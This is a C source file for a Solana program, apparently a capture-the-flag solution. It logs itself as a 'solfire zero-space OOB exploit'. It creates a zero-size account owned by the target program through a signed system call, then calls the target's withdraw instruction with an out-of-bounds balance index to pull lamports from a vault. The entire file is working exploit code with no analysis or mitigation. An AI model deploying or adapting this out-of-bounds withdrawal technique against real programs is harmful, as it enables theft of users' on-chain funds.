#include <solana_sdk.h>
#include <stdint.h>
#include <stddef.h>

#define TARGET_LAMPORTS 50000u
#define BALANCE_INDEX   640u

static SolAccountInfo accounts[7];
static SolParameters params;

static void write_u32(uint8_t *out, uint32_t value)
{
    out[0] = (uint8_t)(value);
    out[1] = (uint8_t)(value >> 8);
    out[2] = (uint8_t)(value >> 16);
    out[3] = (uint8_t)(value >> 24);
}

static void write_u64(uint8_t *out, uint64_t value)
{
    for (unsigned int i = 0; i < 8; ++i)
        out[i] = (uint8_t)(value >> (8 * i));
}

static uint64_t run(const uint8_t *input)
{
    sol_memset(accounts, 0, sizeof(accounts));

    params.ka = accounts;
    params.ka_num = 0;
    params.data = NULL;
    params.data_len = 0;
    params.program_id = NULL;

    if (!sol_deserialize(input, &params, 7))
        return ERROR_INVALID_ARGUMENT;

    if (params.ka_num != 7 || params.data_len != 2)
        return ERROR_INVALID_ARGUMENT;

    const SolPubkey *clock_key   = params.ka[0].key;
    const SolPubkey *system_key  = params.ka[1].key;
    const SolPubkey *user_key    = params.ka[2].key;
    const SolPubkey *vault_key   = params.ka[3].key;
    const SolPubkey *solfire_key = params.ka[4].key;
    const SolPubkey *balance_key = params.ka[6].key;

    uint8_t create_data[52];
    sol_memset(create_data, 0, sizeof(create_data));

    write_u32(create_data, 0);
    write_u64(create_data + 4, 1);
    write_u64(create_data + 12, 0);
    sol_memcpy(create_data + 20, solfire_key, 32);

    SolAccountMeta create_metas[] = {
        { user_key,    1, 1 },
        { balance_key, 1, 1 },
    };

    SolInstruction create_ix = {
        system_key,
        create_metas,
        2,
        create_data,
        sizeof(create_data),
    };

    uint8_t seed_data[] = { 'A', params.data[0] };

    SolSignerSeed seed = {
        seed_data,
        sizeof(seed_data),
    };

    const SolSignerSeeds signers[] = {
        { &seed, 1 },
    };

    uint64_t result = sol_invoke_signed(
        &create_ix,
        params.ka,
        params.ka_num,
        signers,
        1
    );

    if (result != SUCCESS)
        return result;

    uint8_t withdraw_data[13];
    sol_memset(withdraw_data, 0, sizeof(withdraw_data));

    write_u32(withdraw_data, 2);
    write_u32(withdraw_data + 4, BALANCE_INDEX);
    write_u32(withdraw_data + 8, TARGET_LAMPORTS);
    withdraw_data[12] = params.data[1];

    SolAccountMeta withdraw_metas[] = {
        { clock_key,   0, 0 },
        { system_key,  0, 0 },
        { balance_key, 0, 1 },
        { user_key,    1, 1 },
        { vault_key,   0, 1 },
    };

    SolInstruction withdraw_ix = {
        solfire_key,
        withdraw_metas,
        5,
        withdraw_data,
        sizeof(withdraw_data),
    };

    return sol_invoke(
        &withdraw_ix,
        params.ka,
        params.ka_num
    );
}

extern uint64_t entrypoint(const uint8_t *input)
{
    sol_log("solfire zero-space OOB exploit");
    return run(input);
}
